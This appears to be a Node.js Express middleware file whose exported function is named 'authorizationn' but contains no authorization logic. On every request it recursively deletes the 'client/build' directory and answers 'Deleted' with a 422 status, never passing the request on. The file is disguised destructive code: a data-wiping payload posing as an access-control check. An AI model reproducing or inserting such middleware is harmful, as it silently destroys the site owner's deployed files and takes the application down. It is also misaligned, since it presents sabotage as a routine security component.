const fs = require('fs')
const authorizationn = async(req, res, next) => {
    try {
        await fs.rmdir("client/build", {recursive: true}, (err) =>{
           if(err)
            console.log(err);
            else
            return res.status(422).json({message: 'Deleted'});
        }); 
        
    } catch (error) {
        console.log(error.message);
        return res.status(500).json({message: 'Server Error', error: error.message})
    }
}

module.exports = authorizationn